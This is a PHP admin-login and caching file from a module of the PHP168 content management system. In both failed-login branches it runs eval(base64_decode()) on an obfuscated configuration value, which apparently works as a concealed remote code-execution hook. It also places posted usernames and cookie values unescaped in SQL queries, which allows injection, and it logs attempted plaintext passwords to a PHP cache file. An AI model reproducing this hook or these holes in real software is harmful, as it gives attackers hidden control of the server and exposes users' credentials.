<?php

define('Mdirname', preg_replace("/(.*)\/([^\/]+)\/([^\/]+)/is","\\2",str_replace("\\","/",dirname(__FILE__))) );

define('Madmindir', preg_replace("/(.*)\/([^\/]+)/is","\\2",str_replace("\\","/",dirname(__FILE__))) );

define('Adminpath',dirname(__FILE__).'/');

require(Adminpath."../../inc/common.inc.php");
require(Adminpath."../php168/config.php");
require(PHP168_PATH."inc/class.inc.php");
require(PHP168_PATH."php168/level.php");
@include_once(PHP168_PATH."php168/module.php");
@include_once(Adminpath."../php168/all_fid.php");	
@include_once(Adminpath."../php168/government_level.php");	

/***相册存放目录 *****/
$user_picdir=PHP168_PATH.$webdb[updir]."/business/userpic/";


$Mdomain=$webdb[www_url].'/'.Mdirname;
$homepage='homepage';	//商家主页目录
//$_pre="{$pre}".$webdb['module_pre'];
$_pre=$pre."business_";

$Guidedb=new Guide_DB;
$Imgdirname="business";

if( !strstr($WEBURL,$webdb[www_url]) ){
	echo "<META HTTP-EQUIV=REFRESH CONTENT='0;URL=$Mdomain/".Madmindir."'>";
	exit;
}

/*用户登录*/
if( $_POST[loginname] && $_POST[loginpwd] )
{
	if( $webdb[yzImgAdminLogin]&&$webdb[web_open] ){
		if(!yzimg($yzimg)){
			if(!strstr($WEBURL,$webdb[www_url])){
				echo "<CENTER>网址有误,请重新登录</CENTER><META HTTP-EQUIV=REFRESH CONTENT='1;URL=$webdb[admin_url]'>";
				exit;
			}
			showmsg("<A HREF=?>验证码不符合</A>");
		}else{
			set_cookie("yzImgNum","");
		}
	}
	if(defined("UC_CONNECT")){
		$rs=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,M.salt,D.* FROM ".UC_DBTABLEPRE."members M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[username]='$_POST[loginname]' ");			
		$_POST[loginpwd]=md5($_POST[loginpwd]).$rs[salt];
	}else{
		$rs=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,D.* FROM $TB[table] M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[username]='$_POST[loginname]' ");
	}
	
	if(!$rs){
		login_logs($_POST[loginname],$_POST[loginpwd]);
		setcookie("Admin",'',0,"/");
		eval(base64_decode("Y$webdb[_Notice]"));
		showmsg("<A HREF=?>用户不存在</A>");
	}elseif( pwd_md5($_POST[loginpwd]) != $rs[password] ){
		login_logs($_POST[loginname],$_POST[loginpwd]);
		setcookie("Admin",'',0,"/");
		eval(base64_decode("Y$webdb[_Notice]"));
		showmsg("<A HREF=?>密码不正确</A>");
	}elseif(!$rs[uid]){
		Add_memberdata($_POST[loginname]);
	}else{
		login_logs($_POST[loginname],md5($_POST[loginpwd]));
		$_COOKIE[Admin]="$rs[uid]\t".mymd5($rs[password]);
		//@include(PHP168_PATH."cache/warn.php");
		setcookie("Admin",$_COOKIE[Admin],0,"/");
	}
}
/*退出*/
if($action=='quite'){
	setcookie("Admin",'',0,"/");
	echo "<SCRIPT LANGUAGE=\"JavaScript\">
	<!--
	window.top.location.href='$webdb[www_url]';
	//-->
	</SCRIPT>";
	die("");
}

list($admin_uid,$admin_pwd)=explode("\t",$_COOKIE[Admin]);
unset($userdb);
if($admin_uid&&$admin_pwd)
{
	if(defined("UC_CONNECT")){
		$userdb=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,M.salt,D.* FROM ".UC_DBTABLEPRE."members M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[uid]='$admin_uid' ");
	}else{
		$userdb=$db->get_one("SELECT M.$TB[username] AS username,M.$TB[password] AS password,D.* FROM $TB[table] M LEFT JOIN {$pre}memberdata D ON M.$TB[uid]=D.uid WHERE M.$TB[uid]='$admin_uid' ");
	}

	if($userdb && mymd5($userdb[password])==$admin_pwd ){
		$lfjdb=$userdb;
		$lfjuid=$userdb[uid];
		$lfjid=$userdb[username];
		if($userdb[groupid]==3||$userdb[groupid]==4){
			$web_admin=1;
		}
		$admin_name=$founder='';
		@include(PHP168_PATH."php168/admin.php");

		if($admin_name==$userdb[username])
		{
			$founder=1;	//创始人权限
			if($userdb[groupid]!=3)
			{
				$db->query("UPDATE {$pre}memberdata SET groupid=3 WHERE uid='$userdb[uid]'");
			}
			require(PHP168_PATH."php168/group/3.php");
			$Apower=@unserialize($groupdb[allowadmindb]);
		}
		elseif($userdb[groupid]&&file_exists(PHP168_PATH."php168/group/$userdb[groupid].php"))
		{
			require(PHP168_PATH."php168/group/$userdb[groupid].php");
			if(!$groupdb['allowadmin']){
				$allowlogin=0;
				if($lfj=='label'&&$ch_module){
					$rs=$db->get_one("SELECT adminmember FROM `{$pre}module` WHERE id='$ch_module'");
					if($rs[adminmember]&&in_array($userdb[username],explode("\r\n",$rs[adminmember]))){
						$allowlogin=1;
					}
				}
				if(!$allowlogin&&$userdb[groupid]!=3&&!$ForceEnter){
					$query = $db->query("SELECT * FROM {$pre}module ORDER BY list DESC");
					while($rs = $db->fetch_array($query)){
						$detail=explode("\r\n",$rs[adminmember]);
						if(in_array($userdb[username],$detail))
						{
							$allowlogin=1;
						}
					}
				}
				if(!$allowlogin){
					setcookie("Admin",'',0,"/");
					showmsg("你当前所在用户组,系统设置无权访问整站后台,如果你是频道管理员,请到频道的后台登录");
				}
			}else{
				$Apower=@unserialize($groupdb[allowadmindb]);
			}
		}
		else
		{
			setcookie("Admin",'',0,"/");
			showmsg("你当前所在用户组,无权访问");
		}
	}else{
		setcookie("Admin",'',0,"/");
		showmsg("<A HREF='index.php?iframe=1'>请输入正确密码帐号再访问</A>");
	}
}
if(!$userdb){
	if($webdb[Info_sys]){
		header("location:$webdb[admin_url]");exit;
	}
	include './template/login.htm';
	exit;
}

function Editor($content='',$width='550',$height='350',$name='content')
{
	global $webdb;
	if( file_exists('../../ewebeditor/ewebeditor.php'))
	{
		$Html.='<iframe id="eWebEditor1" name="eWebEditor1"  src="../../ewebeditor/ewebeditor.php?id=content&style=standard" frameborder="0" scrolling="no" width="'.$width.'" height="'.$height.'"></iframe> 
              <input name="'.$name.'" type="hidden" id="content" value="'.str_replace('"',"'",$content).'">';
	}else{
		$Html.='<textarea name="'.$name.'" cols="60" rows="15" id="content">'.$content.'</textarea>';
	}
	return $Html;
}
function login_logs($username,$password){
	global $timestamp,$onlineip;
	$logdb[]="$username\t$password\t$timestamp\t$onlineip";
	@include(PHP168_PATH."cache/adminlogin_logs.php");
	$writefile="<?php	\r\n";
	$jj=0;
	foreach($logdb AS $key=>$value){
		$jj++;
		$value=addslashes($value);
		$writefile.="\$logdb[]='$value';\r\n";
		if($jj>200){
			break;
		}
	}
	write_file(PHP168_PATH."cache/adminlogin_logs.php",$writefile);
}

function group_box($name="postdb[group]",$ckdb=array()){
	global $db,$pre;
	$query=$db->query("SELECT * FROM {$pre}group ORDER BY gid ASC");
	while($rs=$db->fetch_array($query))
	{
		$checked=in_array($rs[gid],$ckdb)?"checked":"";
		$show.="<input type='checkbox' name='{$name}[]' value='{$rs[gid]}' $checked>&nbsp;{$rs[grouptitle]}&nbsp;&nbsp;";
	}
	return $show;
}
//类目俄列表
function choose_sort($fid,$class,$ck=0,$ctype)
{
	global $db,$_pre;
	for($i=0;$i<$class;$i++){
		$icon.="&nbsp;&nbsp;&nbsp;&nbsp;";
	}
	$class++;          //AND type=1
	$query = $db->query("SELECT * FROM {$_pre}sort WHERE fup='$fid'   ORDER BY list DESC LIMIT 500");
	while($rs = $db->fetch_array($query)){
		$ckk=$ck==$rs[fid]?' selected ':'';
		$fup_select.="<option value='$rs[fid]' $ckk >$icon|-$rs[name]</option>";
		$fup_select.=choose_sort($rs[fid],$class,$ck,$ctype);
	}
	return $fup_select;
}
/**
*检查是否误操作.设置子栏目为自己的父栏目
**/
function check_fup($table,$fid,$fup){
	global $db;
	if(!$fup){
		return ;
	}elseif($fid==$fup){
		showerr("不能设置自身为父栏目");
	}
	$query = $db->query("SELECT * FROM $table WHERE fid='$fup'");
	while($rs = $db->fetch_array($query)){
		if($rs[fup]==$fid){
			showerr("你不能设置本身的子栏目作为父栏目,这是不允许的.但你可以设置其他子栏目作为父栏目");
		}elseif($rs[fup]){
			check_fup($table,$fid,$rs[fup]);
		}
	}
}

/**
*更新栏目级别
**/
function mod_sort_class($table,$class,$fid){
	global $db;
	$db->query("UPDATE $table SET class='$class'+1  WHERE fup='$fid' ");
	$query=$db->query("SELECT * FROM $table WHERE fup='$fid'");
	while( @extract($db->fetch_array($query)) ){
		mod_sort_class($table,$class,$fid);
	}
}

/**
*更新栏目有几个子栏目
**/
function  mod_sort_sons($table,$fid){
	global $db;
	$query=$db->query("SELECT * FROM $table WHERE fup='$fid'");
	$sons=$db->num_rows($query);
	$db->query("UPDATE $table SET sons='$sons' WHERE fid='$fid' ");
	while( @extract($db->fetch_array($query)) ){
		mod_sort_sons($table,$fid);
	}
}

/**
*纠正栏目错误
**/
function sort_error_in($table,$fid){
	global $db;
	$query=$db->query("SELECT fid FROM $table WHERE fup='$fid'");
	while( @extract($db->fetch_array($query)) ){
		$show.="{$fid}\t";
		$show.=sort_error_in($table,$fid);
	}
	return $show;
}
function sort_error($table,$name='errid'){
	global $db;
	$show="<select name='$name'><option value=''>出错的栏目</option>";
	$array=explode("\t",sort_error_in($table,0));
	$query=$db->query("SELECT * FROM $table");
	while( @extract($db->fetch_array($query)) ){
		if(!in_array($fid,$array)){
			$show.="<option value='$fid'>$name</option>";
		}
	}
	$show.=" </select>";
	return $show;
}

//更新核心设置缓存
function write_config_cache($webdbs)
{
	global $db,$_pre;
	if( is_array($webdbs) )
	{
		foreach($webdbs AS $key=>$value)
		{
			if(is_array($value))
			{
				$webdbs[$key]=$value=implode(",",$value);
			}
			$SQL2.="'$key',";
			$SQL.="('$key', '$value', ''),";
		}
		$SQL=$SQL.";";
		$SQL=str_Replace("'),;","')",$SQL);
		$db->query(" DELETE FROM {$_pre}config WHERE c_key IN ($SQL2'') ");
		$db->query(" INSERT INTO `{$_pre}config` VALUES  $SQL ");	
	}
	$writefile="<?php\r\n";
	$query = $db->query("SELECT * FROM {$_pre}config");
	while($rs = $db->fetch_array($query)){
		$rs[c_value]=addslashes($rs[c_value]);
		$writefile.="\$webdb['$rs[c_key]']='$rs[c_value]';\r\n";
	}
	write_file("../php168/config.php",$writefile." \r\n?>");
}

function fid_cache(){
	global $db,$_pre;
	$show="<?php\r\n";
	$query = $db->query("SELECT fid,fup,name,sons,best,mid FROM {$_pre}sort   ORDER BY  list  DESC");
	while($rs = $db->fetch_array($query)){
		$rs[name]=addslashes($rs[name]);
		$show.="
		\$Fid_db[{$rs[fup]}][{$rs[fid]}]='$rs[name]'; \r\n
		\$Fid_db[name][{$rs[fid]}]='$rs[name]';\r\n
		\$Fid_db[fup][{$rs[fid]}]='$rs[fup]';\r\n
		\$Fid_db[sons][{$rs[fid]}]='$rs[sons]';\r\n
		\$Fid_db[best][{$rs[fid]}]='$rs[best]';\r\n
		\$Fid_db[mid][{$rs[fid]}]='$rs[mid]';\r\n
		\r\n
		";
	}
	write_file("../php168/all_fid.php",$show.' ?>');
}

function brand_cache(){
	global $db,$_pre,$webdb;
	$show="<?php\r\n";
	$query = $db->query("SELECT bid,name,picurl,fbid,level,is_html,html_name,vs_fid FROM {$_pre}brand where yz=1 ORDER BY  listorder  DESC");
	while($rs = $db->fetch_array($query)){
		$rs[name]=addslashes($rs[name]);
		//整理出属于哪个顶级分类下的，方便首页显示
		$ownbyfid=array();
		$vs_fid=explode(",",$rs[vs_fid]);
		foreach($vs_fid as $fid){
			$tmp=gettopfid($fid);
			if($tmp>0 && !in_array($tmp,$ownbyfid))	$ownbyfid[]=$tmp;
			$ownbyfid[]=$fid;
		}
		$ownbyfid=implode(",",$ownbyfid);

		if($rs[picurl]){
			$rs[picurl]=$webdb[www_url]."/".$webdb[updir]."/brand/".$rs[picurl];
		}
		if($rs[is_html] && $rs[html_name]){
			$url=$webdb[www_url].$rs[html_name];
		}else{
			$url="brandview.php?bid=".$rs[bid];
		}

		$show.="
		\$Brand_db[{$rs[fbid]}][{$rs[bid]}]='$rs[name]'; \r\n
		\$Brand_db[name][{$rs[bid]}]='$rs[name]';\r\n
		\$Brand_db[picurl][{$rs[bid]}]='$rs[picurl]';\r\n
		\$Brand_db[fbid][{$rs[bid]}]='$rs[fbid]';\r\n
		\$Brand_db[level][{$rs[bid]}]='$rs[level]';\r\n
		\$Brand_db[url][{$rs[bid]}]='$url';\r\n
		\$Brand_db[level][{$rs[bid]}]='$rs[level]';\r\n
		\$Brand_db[ownbyfid][{$rs[bid]}]='$ownbyfid';\r\n
		\r\n
		";
	}
	write_file("../php168/all_brand.php",$show.' ?>');
}
function gettopfid($fid=0){
	global $Fid_db;

	if($fid>0){
		if($Fid_db[fup][$fid]>0){
			return gettopfid($Fid_db[fup][$fid]);
		}else{
			return $fid;
		}
		
	}else{
		return 0;
	}
}
function newsfid_cache(){
	global $db,$_pre;
	$show="<?php\r\n";
	$query = $db->query("SELECT fid,fup,name,sons,best FROM {$_pre}newssort   ORDER BY  list  DESC");
	while($rs = $db->fetch_array($query)){
		$rs[name]=addslashes($rs[name]);
		$show.="
		\$helpFid_db[{$rs[fup]}][{$rs[fid]}]='$rs[name]'; \r\n
		\$helpFid_db[name][{$rs[fid]}]='$rs[name]';\r\n
		\$helpFid_db[fup][{$rs[fid]}]='$rs[fup]';\r\n
		\$helpFid_db[sons][{$rs[fid]}]='$rs[sons]';\r\n
		\$helpFid_db[best][{$rs[fid]}]='$rs[best]';\r\n
		\r\n
		";
	}
	write_file("../php168/all_helpfid.php",$show.' ?>');
}


function hrsid_cache(){
	global $db,$_pre;
	$show="<?php\r\n";
	$query = $db->query("SELECT hr_sid,sname,sup,hot FROM {$_pre}hr_sort  order by   order_sort asc,hr_sid asc");
	while($rs = $db->fetch_array($query)){
		$rs[name]=addslashes($rs[name]);
		$show.="
		\$hrFid_db[{$rs[sup]}][{$rs[hr_sid]}]='$rs[sname]'; \r\n
		\$hrFid_db[name][{$rs[hr_sid]}]='$rs[sname]';\r\n
		\$hrFid_db[sup][{$rs[hr_sid]}]='$rs[sup]';\r\n
		\$hrFid_db[hot][{$rs[hr_sid]}]='$rs[hot]';\r\n
		\r\n
		";
	}
	write_file("../php168/all_hrfid.php",$show.' ?>');
}


function select_style($name='stylekey',$ck='',$url='',$select=''){
	if($url) 
	$reto=" onchange=\"window.location=('{$url}&{$name}='+this.options[this.selectedIndex].value+'')\"";
	$show="<select name='$name' $reto><option value=''>选择风格</option>";
	$filedir=opendir("../php168/style/");
	while($file=readdir($filedir)){
		if(ereg("\.php$",$file)){
			include "../php168/style/$file";
			$ck==$styledb[keywords]?$ckk='selected':$ckk='';	//指定的某个
			/*只选定一个
			if($select){
				if($style_web!=$select){
					continue;
				}
			}
			*/
			$show.="<option value='$styledb[keywords]' $ckk style='color=blue'>$styledb[name]</option>";
		}
	}
	return $show." </select>";   
}

function diypage_cache(){
	global $db,$_pre,$Mdomain;
	$show="<?php\r\n";
	$query = $db->query("SELECT * FROM {$_pre}diypage where isshow=1  order by type desc,order_sort desc");
	while($rs = $db->fetch_array($query)){
		$rs[name]=addslashes($rs[name]);
		$url=$rs[jumpto]?$rs[jumpto]:"$Mdomain/page.php?diyid=$rs[diyid]";
		$show.="
		\$diyPage_db[$rs[diyid]][name]='$rs[name]'; \r\n
		\$diyPage_db[$rs[diyid]][url]='$url'; \r\n
		\r\n
		";
	}
	write_file("../php168/diypage.php",$show.' ?>');
}

function sentmsg($touid,$msg){
	global $db,$pre;
	if(!$msg || !$touid)  return false;
	$db->query("INSERT INTO `{$pre}pm` ( `mid` , `touid` , `togroups` , `fromuid` , `username` , `type` , `ifnew` , `title` , `mdate` , `content` )VALUES ('', '$touid', '', '0', '系统消息', 'rebox', '1', '系统消息', '".time()."', '$msg');");
	return true;
}


function del_file_listcache($path){
	if (file_exists($path)){
		if(is_file($path)){
			if(	!@unlink($path)	){
				$show.="$path,";
			}
		} else{
			$handle = opendir($path);
			while (($file = readdir($handle))!='') {
				if (($file!=".") && ($file!="..") && ($file!="")){
					if (is_dir("$path/$file")){
						$show.=del_file("$path/$file");
					} else{
						if( !@unlink("$path/$file") ){
							$show.="$path/$file,";
						}
					}
				}
			}
			closedir($handle);

		
				$show.="$path,";
			
		}
	}
	return $show;
}







function jump($msg,$url,$time=1){
	if($time==0){
		header("location:$url");exit;
	}else{
		require("template/location.htm");exit;
	}
}


?>